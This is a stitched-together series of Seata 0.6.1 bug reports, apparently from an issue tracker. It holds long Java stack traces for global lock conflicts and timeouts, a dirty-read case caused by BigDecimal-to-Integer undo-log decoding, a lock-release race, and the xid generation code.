org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:836) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1747) [tomcat-embed-core-9.0.19.jar:9.0.19] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.19.jar:9.0.19] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_191] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_191] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.19.jar:9.0.19] at java.lang.thread.run(thread.java:748) [na:1.8.0_191]
caused by: java.sql.sqlexception: io.seata.core.exception.transactionexception: response[runtimeexception[null]] at io.seata.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:130) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:107) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.processlocalcommitwithgloballocks(connectionproxy.java:166) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.commit(connectionproxy.java:158) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.setautocommit(connectionproxy.java:218) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.executeautocommittrue(abstractdmlbaseexecutor.java:107) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.exec.abstractdmlbaseexecutor.doexecute(abstractdmlbaseexecutor.java:57) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:86) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.preparedstatementproxy.execute(preparedstatementproxy.java:63) ~[seata-rm-datasource-0.6.1.jar:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_191] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_191] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_191] at org.apache.ibatis.logging.jdbc.preparedstatementlogger.invoke(preparedstatementlogger.java:59) ~[mybatis-3.5.1.jar:3.5.1] at com.sun.proxy.$proxy161.execute(unknown source) ~[na:na] at org.apache.ibatis.executor.statement.preparedstatementhandler.update(preparedstatementhandler.java:47) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.executor.statement.routingstatementhandler.update(routingstatementhandler.java:74) ~[mybatis-3.5.1.jar:3.5.1] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_191] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_191] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_191] at org.apache.ibatis.plugin.plugin.invoke(plugin.java:63) ~[mybatis-3.5.1.jar:3.5.1] at com.sun.proxy.$proxy160.update(unknown source) ~[na:na] at com.baomidou.mybatisplus.core.executor.mybatissimpleexecutor.doupdate(mybatissimpleexecutor.java:54) ~[mybatis-plus-core-3.1.1.jar:3.1.1] at org.apache.ibatis.executor.baseexecutor.update(baseexecutor.java:117) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.executor.cachingexecutor.update(cachingexecutor.java:76) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.session.defaults.defaultsqlsession.update(defaultsqlsession.java:197) ~[mybatis-3.5.1.jar:3.5.1] at org.apache.ibatis.session.defaults.defaultsqlsession.insert(defaultsqlsession.java:184) ~[mybatis-3.5.1.jar:3.5.1] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_191] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_191] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_191] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_191] at org.mybatis.spring.sqlsessiontemplate$sqlsessioninterceptor.invoke(sqlsessiontemplate.java:433) ~[mybatis-spring-2.0.1.jar:2.0.1] ..
101 common frames omitted
caused by: io.seata.core.exception.transactionexception: response[runtimeexception[null]] at io.seata.rm.datasource.datasourcemanager.lockquery(datasourcemanager.java:94) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.defaultresourcemanager.lockquery(defaultresourcemanager.java:109) ~[seata-rm-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:102) ~[seata-rm-datasource-0.6.1.jar:na] ..
134 common frames omitted
![image](
so, in my test code, i construct a case through adding some codes in gt1: `sleep(10000);`
`throw runtimeexception`
after a finished branch transactional which update a record, then running gt2 to query the same record in gt1's sleeping duration
gt2 get a dirty data.
i found there called validate method in [io.seata.rm.datasource.undo.abstractundoexecutor#executeon]( #l102), when compare beforerecords and currentrecords for field `pay_amount` in [io.seata.rm.datasource.datacompareutils#isfieldequals]( #l48), it return false
and i found the beforerecords's filed `pay_amount` class type is integer, but the currentrecords is bigdecimal
and the column is decimal too
finally, i found the difference come from [io.seata.rm.datasource.undo.jsonbasedundologparser#decode]( #l53)
the bigdecimal was converted to integer after deserialized.
seata release global lock by branch
if branch lock and finish doglobalrollback before addbranch, then lock won't be release
branchregister --> lock --> doglobalrollback(timeout) --> addbranch(fail)
i use the code in the seata-sample(springboot-dubbo-seata) example
//
if (true) { throw new runtimeexception(" ");
however, no global rollback occurred.
and no other exceptions were thrown during operation.
![4270faf3-bd4a-4fe0-bff1-de601103b52f](
caused by: java.sql.sqlexception: parameter index out of range (5 > number of parameters, which is 4)
at com.mysql.jdbc.sqlerror.createsqlexception(sqlerror.java:1094) at com.mysql.jdbc.sqlerror.createsqlexception(sqlerror.java:997) at com.mysql.jdbc.sqlerror.createsqlexception(sqlerror.java:983) at com.mysql.jdbc.sqlerror.createsqlexception(sqlerror.java:928) at com.mysql.jdbc.preparedstatement.checkbounds(preparedstatement.java:3688) at com.mysql.jdbc.preparedstatement.setinternal(preparedstatement.java:3670) at com.mysql.jdbc.preparedstatement.setinternal(preparedstatement.java:3715) at com.mysql.jdbc.preparedstatement.setint(preparedstatement.java:3659) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_setint(filterchainimpl.java:3251) at com.alibaba.druid.filter.filteradapter.preparedstatement_setint(filteradapter.java:1259) at com.alibaba.druid.filter.filterchainimpl.preparedstatement_setint(filterchainimpl.java:3248) at com.alibaba.druid.proxy.jdbc.preparedstatementproxyimpl.setint(preparedstatementproxyimpl.java:386) at com.alibaba.druid.pool.druidpooledpreparedstatement.setint(druidpooledpreparedstatement.java:315) at io.seata.rm.datasource.undo.undologmanager.insertundolog(undologmanager.java:358) at io.seata.rm.datasource.undo.undologmanager.insertundologwithnormal(undologmanager.java:340) at io.seata.rm.datasource.undo.undologmanager.flushundologs(undologmanager.java:117) at io.seata.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:184) ..
2019-06-04 10:25:38.783 warn [configoperate_1_2]io.seata.config.fileconfiguration.run:204 -could not found property service.disableglobaltransaction, try to use default value instead.
2019-06-04 10:25:38.789 info [main]io.seata.spring.annotation.globaltransactionscanner.initclient:163 -initializing global transaction clients ..
2019-06-04 10:25:38.999 info [main]io.seata.core.rpc.netty.abstractrpcremotingclient.start:216 -abstractrpcremotingclient has started
2019-06-04 10:25:39.006 info [main]io.seata.spring.annotation.globaltransactionscanner.initclient:172 -transaction manager client is initialized
applicationid[dubbo-demo-app] txservicegroup[my_test_tx_group]
2019-06-04 10:25:39.021 info [main]io.seata.rm.datasource.asyncworker.init:126 -async commit buffer limit: 10000
2019-06-04 10:25:39.026 info [main]io.seata.core.rpc.netty.abstractrpcremotingclient.start:216 -abstractrpcremotingclient has started
2019-06-04 10:25:39.027 info [main]io.seata.spring.annotation.globaltransactionscanner.initclient:179 -resource manager is initialized
applicationid[dubbo-demo-app] txservicegroup[my_test_tx_group]
2019-06-04 10:25:39.027 info [main]io.seata.spring.annotation.globaltransactionscanner.initclient:185 -global transaction clients are initialized
2019-06-04 10:25:39.930 info [main]io.seata.spring.annotation.globaltransactionscanner.wrapifnecessary:229 -bean[com.alibaba.fescar.workshop.service.impl.businessserviceimpl] with name [business] would use interceptor [io.seata.spring.annotation.globaltransactionalinterceptor]
2019-06-04 10:25:40.008 info [main]io.seata.common.loader.enhancedserviceloader.loadfile:237 -load contextcore[null] extension by class[io.seata.core.context.threadlocalcontextcore]
2019-06-04 10:25:40.012 info [main]io.seata.common.loader.enhancedserviceloader.loadfile:237 -load transactionmanager[null] extension by class[io.seata.tm.defaulttransactionmanager]
2019-06-04 10:25:40.012 info [main]io.seata.tm.transactionmanagerholder.<clinit>:40 -transactionmanager singleton io.seata.tm.defaulttransactionmanager@28a0fd6c
2019-06-04 10:25:40.019 info [main]io.seata.common.loader.enhancedserviceloader.loadfile:237 -load loadbalance[null] extension by class[io.seata.discovery.loadbalance.randomloadbalance]
2019-06-04 10:25:40.021 info [main]io.seata.core.rpc.netty.nettypoolablefactory.makeobject:56 -nettypool create channel to transactionrole:tmrole,address:127.0.0.1:8091,msg:< registertmrequest{applicationid='dubbo-demo-app', transactionservicegroup='my_test_tx_group'} >
2019-06-04 10:25:40.071 info [main]io.seata.core.rpc.netty.nettypoolablefactory.makeobject:81 -register success, cost 24 ms, version:0.6.1,role:tmrole,channel:[id: , l:/127.0.0.1:55934 - r:/127.0.0.1:8091]
2019-06-04 10:25:40.074 info [main]io.seata.tm.api.defaultglobaltransaction.begin:98 -begin new global transaction [192.168.0.230:8091:2013343004]
2019-06-04 10:25:40.090 info [main]com.alibaba.fescar.workshop.service.businessservice.purchase:42 -purchase begin ..
xid: 192.168.0.230:8091:2013343004
2019-06-04 10:25:40.966 info [main]io.seata.tm.api.defaultglobaltransaction.rollback:148 -[192.168.0.230:8091:2013343004] rollback status:rollbacked
exception in thread "main" java.lang.runtimeexception: org.springframework.dao.querytimeoutexception: statementcallback; sql [select * from order_tbl where id=\'2\' for update]; global lock wait timeout; nested exception is io.seata.rm.datasource.exec.lockwaittimeoutexception: global lock wait timeout
org.springframework.dao.querytimeoutexception: statementcallback; sql [select * from order_tbl where id='2' for update]; global lock wait timeout; nested exception is io.seata.rm.datasource.exec.lockwaittimeoutexception: global lock wait timeout at org.springframework.jdbc.support.sqlstatesqlexceptiontranslator.dotranslate(sqlstatesqlexceptiontranslator.java:120) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:72) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.support.abstractfallbacksqlexceptiontranslator.translate(abstractfallbacksqlexceptiontranslator.java:81) at org.springframework.jdbc.core.jdbctemplate.translateexception(jdbctemplate.java:1444) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:388) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:418) at com.alibaba.fescar.workshop.service.impl.orderserviceimpl.createtest(orderserviceimpl.java:140) at com.alibaba.dubbo.common.bytecode.wrapper2.invokemethod(wrapper2.java) at com.alibaba.dubbo.rpc.proxy.javassist.javassistproxyfactory$1.doinvoke(javassistproxyfactory.java:47) at com.alibaba.dubbo.rpc.proxy.abstractproxyinvoker.invoke(abstractproxyinvoker.java:76) at com.alibaba.dubbo.config.invoker.delegateprovidermetadatainvoker.invoke(delegateprovidermetadatainvoker.java:52) at com.alibaba.dubbo.rpc.protocol.invokerwrapper.invoke(invokerwrapper.java:56) at io.seata.integration.dubbo.alibaba.transactionpropagationfilter.invoke(transactionpropagationfilter.java:61) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:62) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:75) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:42) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:78) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:73) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:138) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.echofilter.invoke(echofilter.java:38) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:104) at com.alibaba.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:96) at com.alibaba.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:173) at com.alibaba.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) at com.alibaba.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
caused by: io.seata.rm.datasource.exec.lockwaittimeoutexception: global lock wait timeout at io.seata.rm.datasource.exec.lockretrycontroller.sleep(lockretrycontroller.java:50) at io.seata.rm.datasource.exec.selectforupdateexecutor.doexecute(selectforupdateexecutor.java:128) at io.seata.rm.datasource.exec.basetransactionalexecutor.execute(basetransactionalexecutor.java:86) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:101) at io.seata.rm.datasource.exec.executetemplate.execute(executetemplate.java:47) at io.seata.rm.datasource.statementproxy.execute(statementproxy.java:87) at org.springframework.jdbc.core.jdbctemplate$1executestatementcallback.doinstatement(jdbctemplate.java:409) at org.springframework.jdbc.core.jdbctemplate.execute(jdbctemplate.java:376) ..
caused by: io.seata.rm.datasource.exec.lockconflictexception at io.seata.rm.datasource.connectionproxy.checklock(connectionproxy.java:104) at io.seata.rm.datasource.exec.selectforupdateexecutor.doexecute(selectforupdateexecutor.java:115) ..
39 more at com.alibaba.dubbo.rpc.filter.exceptionfilter.invoke(exceptionfilter.java:106) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.monitor.support.monitorfilter.invoke(monitorfilter.java:75) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.timeoutfilter.invoke(timeoutfilter.java:42) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.protocol.dubbo.filter.tracefilter.invoke(tracefilter.java:78) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.contextfilter.invoke(contextfilter.java:73) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.genericfilter.invoke(genericfilter.java:138) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.classloaderfilter.invoke(classloaderfilter.java:38) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.filter.echofilter.invoke(echofilter.java:38) at com.alibaba.dubbo.rpc.protocol.protocolfilterwrapper$1.invoke(protocolfilterwrapper.java:72) at com.alibaba.dubbo.rpc.protocol.dubbo.dubboprotocol$1.reply(dubboprotocol.java:104) at com.alibaba.dubbo.remoting.exchange.support.header.headerexchangehandler.handlerequest(headerexchangehandler.java:96) at com.alibaba.dubbo.remoting.exchange.support.header.headerexchangehandler.received(headerexchangehandler.java:173) at com.alibaba.dubbo.remoting.transport.decodehandler.received(decodehandler.java:51) at com.alibaba.dubbo.remoting.transport.dispatcher.channeleventrunnable.run(channeleventrunnable.java:57) at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) at java.lang.thread.run(thread.java:748)
2019-06-01 16:19:45.571 error 25654 --- [nio-8081-exec-1] o.a.c.c.c.[.[.[/].[dispatcherservlet] : servlet.service() for servlet [dispatcherservlet] in context with path [] threw exception [request processing failed; nested exception is org.springframework.orm.jpa.jpasystemexception: unable to commit against jdbc connection; nested exception is org.hibernate.transactionexception: unable to commit against jdbc connection] with root cause io.seata.rm.datasource.exec.lockconflictexception: null at io.seata.rm.datasource.connectionproxy.recognizelockkeyconflictexception(connectionproxy.java:128) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.processglobaltransactioncommit(connectionproxy.java:179) ~[seata-rm-datasource-0.6.1.jar:na] at io.seata.rm.datasource.connectionproxy.commit(connectionproxy.java:156) ~[seata-rm-datasource-0.6.1.jar:na] at org.hibernate.resource.jdbc.internal.abstractlogicalconnectionimplementor.commit(abstractlogicalconnectionimplementor.java:81) ~[hibernate-core-5.3.9.final.jar:5.3.9.final] at org.hibernate.resource.transaction.backend.jdbc.internal.jdbcresourcelocaltransactioncoordinatorimpl$transactiondrivercontrolimpl.commit(jdbcresourcelocaltransactioncoordinatorimpl.java:272) ~[hibernate-core-5.3.9.final.jar:5.3.9.final] at org.hibernate.engine.transaction.internal.transactionimpl.commit(transactionimpl.java:104) ~[hibernate-core-5.3.9.final.jar:5.3.9.final] at org.springframework.orm.jpa.jpatransactionmanager.docommit(jpatransactionmanager.java:532) ~[spring-orm-5.1.6.release.jar:5.1.6.release] at org.springframework.transaction.support.abstractplatformtransactionmanager.processcommit(abstractplatformtransactionmanager.java:746) ~[spring-tx-5.1.6.release.jar:5.1.6.release] at org.springframework.transaction.support.abstractplatformtransactionmanager.commit(abstractplatformtransactionmanager.java:714) ~[spring-tx-5.1.6.release.jar:5.1.6.release] at org.springframework.transaction.interceptor.transactionaspectsupport.committransactionafterreturning(transactionaspectsupport.java:533) ~[spring-tx-5.1.6.release.jar:5.1.6.release] at org.springframework.transaction.interceptor.transactionaspectsupport.invokewithintransaction(transactionaspectsupport.java:304) ~[spring-tx-5.1.6.release.jar:5.1.6.release] at org.springframework.transaction.interceptor.transactioninterceptor.invoke(transactioninterceptor.java:98) ~[spring-tx-5.1.6.release.jar:5.1.6.release] at org.springframework.aop.framework.reflectivemethodinvocation.proceed(reflectivemethodinvocation.java:186) ~[spring-aop-5.1.6.release.jar:5.1.6.release] at org.springframework.aop.framework.cglibaopproxy$dynamicadvisedinterceptor.intercept(cglibaopproxy.java:688) ~[spring-aop-5.1.6.release.jar:5.1.6.release] at com.example.demo.service.storageservice$$enhancerbyspringcglib$$d9a1d7fa.deduct(<generated>) ~[classes/:na] at com.example.demo.controller.storagecontroller.deduct(storagecontroller.java:22) ~[classes/:na] at sun.reflect.nativemethodaccessorimpl.invoke0(native method) ~[na:1.8.0_201] at sun.reflect.nativemethodaccessorimpl.invoke(nativemethodaccessorimpl.java:62) ~[na:1.8.0_201] at sun.reflect.delegatingmethodaccessorimpl.invoke(delegatingmethodaccessorimpl.java:43) ~[na:1.8.0_201] at java.lang.reflect.method.invoke(method.java:498) ~[na:1.8.0_201] at org.springframework.web.method.support.invocablehandlermethod.doinvoke(invocablehandlermethod.java:189) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.method.support.invocablehandlermethod.invokeforrequest(invocablehandlermethod.java:138) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.annotation.servletinvocablehandlermethod.invokeandhandle(servletinvocablehandlermethod.java:102) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.invokehandlermethod(requestmappinghandleradapter.java:892) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.annotation.requestmappinghandleradapter.handleinternal(requestmappinghandleradapter.java:797) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.mvc.method.abstracthandlermethodadapter.handle(abstracthandlermethodadapter.java:87) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.dispatcherservlet.dodispatch(dispatcherservlet.java:1038) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.dispatcherservlet.doservice(dispatcherservlet.java:942) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.frameworkservlet.processrequest(frameworkservlet.java:1005) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at org.springframework.web.servlet.frameworkservlet.doget(frameworkservlet.java:897) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at javax.servlet.http.httpservlet.service(httpservlet.java:634) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.web.servlet.frameworkservlet.service(frameworkservlet.java:882) ~[spring-webmvc-5.1.6.release.jar:5.1.6.release] at javax.servlet.http.httpservlet.service(httpservlet.java:741) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:231) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.tomcat.websocket.server.wsfilter.dofilter(wsfilter.java:53) ~[tomcat-embed-websocket-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at com.alibaba.druid.support.http.webstatfilter.dofilter(webstatfilter.java:123) ~[druid-1.1.10.jar:1.1.10] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.boot.actuate.web.trace.servlet.httptracefilter.dofilterinternal(httptracefilter.java:90) ~[spring-boot-actuator-2.1.4.release.jar:2.1.4.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.web.filter.requestcontextfilter.dofilterinternal(requestcontextfilter.java:99) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.web.filter.formcontentfilter.dofilterinternal(formcontentfilter.java:92) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.web.filter.hiddenhttpmethodfilter.dofilterinternal(hiddenhttpmethodfilter.java:93) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.boot.actuate.metrics.web.servlet.webmvcmetricsfilter.filterandrecordmetrics(webmvcmetricsfilter.java:117) ~[spring-boot-actuator-2.1.4.release.jar:2.1.4.release] at org.springframework.boot.actuate.metrics.web.servlet.webmvcmetricsfilter.dofilterinternal(webmvcmetricsfilter.java:106) ~[spring-boot-actuator-2.1.4.release.jar:2.1.4.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.springframework.web.filter.characterencodingfilter.dofilterinternal(characterencodingfilter.java:200) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.springframework.web.filter.onceperrequestfilter.dofilter(onceperrequestfilter.java:107) ~[spring-web-5.1.6.release.jar:5.1.6.release] at org.apache.catalina.core.applicationfilterchain.internaldofilter(applicationfilterchain.java:193) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.applicationfilterchain.dofilter(applicationfilterchain.java:166) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.standardwrappervalve.invoke(standardwrappervalve.java:200) ~[tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.standardcontextvalve.invoke(standardcontextvalve.java:96) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.authenticator.authenticatorbase.invoke(authenticatorbase.java:490) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.standardhostvalve.invoke(standardhostvalve.java:139) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.valves.errorreportvalve.invoke(errorreportvalve.java:92) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.core.standardenginevalve.invoke(standardenginevalve.java:74) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.catalina.connector.coyoteadapter.service(coyoteadapter.java:343) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.coyote.http11.http11processor.service(http11processor.java:408) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.coyote.abstractprocessorlight.process(abstractprocessorlight.java:66) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.coyote.abstractprotocol$connectionhandler.process(abstractprotocol.java:834) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.tomcat.util.net.nioendpoint$socketprocessor.dorun(nioendpoint.java:1415) [tomcat-embed-core-9.0.17.jar:9.0.17] at org.apache.tomcat.util.net.socketprocessorbase.run(socketprocessorbase.java:49) [tomcat-embed-core-9.0.17.jar:9.0.17] at java.util.concurrent.threadpoolexecutor.runworker(threadpoolexecutor.java:1149) [na:1.8.0_201] at java.util.concurrent.threadpoolexecutor$worker.run(threadpoolexecutor.java:624) [na:1.8.0_201] at org.apache.tomcat.util.threads.taskthread$wrappingrunnable.run(taskthread.java:61) [tomcat-embed-core-9.0.17.jar:9.0.17] at java.lang.thread.run(thread.java:748) [na:1.8.0_201] ```
a global transaction's xid is generated by method `xid.generatexid()`, which composes `ipaddress`, `port` and `uuid`.so xid is machine-related.
public class xid { private static int port; private static string ipaddress; /** * generate xid string
* * @param tranid the tran id * @return the string */ public static string generatexid(long tranid) { return ipaddress + ":" + port + ":" + tranid; } //...
